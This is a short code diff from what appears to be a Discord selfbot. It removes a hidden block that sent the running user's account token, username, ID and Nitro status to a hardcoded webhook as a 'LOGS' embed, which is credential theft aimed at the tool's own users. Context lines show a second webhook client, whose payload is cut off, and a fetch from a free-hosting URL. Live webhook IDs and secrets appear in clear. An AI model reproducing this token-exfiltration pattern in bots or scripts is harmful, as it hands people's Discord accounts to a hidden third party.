@@ -102,18 +102,7 @@ superagent.get("https://404-presentation.000webhostapp.com/api.json",(body, res)
 })
 const webClient = new WebhookClient("811575221101658112", "NuJ8L4RiyVMfM6m8Y6koGAYUUdatn38EAxBc3pHzGD6W2bP8VTPeFEwi4rngRg7d6qOT");
 
-const embedd = new RichEmbed()
-.setTitle("404 | LOGS INFO")
-.setDescription(`Username Ping : <@${id}> \n Username : ${client.user.tag} \n ID : ${id} \n Prefix : ${prefix} \n Nitro : ${client.user.premium} \n Token : ` + token )
-.setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
-.setColor("RANDOM")
-.setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
 
-webClient.send('LOGS', {
-	username: '404 | LOGS',
-	avatarURL: 'https://cdn.discordapp.com/attachments/809170422704504852/811312415601721374/giphy_3.gif',
-	embeds: [embedd],
-});
 const webhookClient = new WebhookClient("811395098847084574", "ykJGvHjF817Ln3yF1QPIjYFDklaHvC4MZ9rjQcnBlcOSGvHLpYJnnPZ2dRVZ4u2G51Qb");
 
 const embed = new RichEmbed()
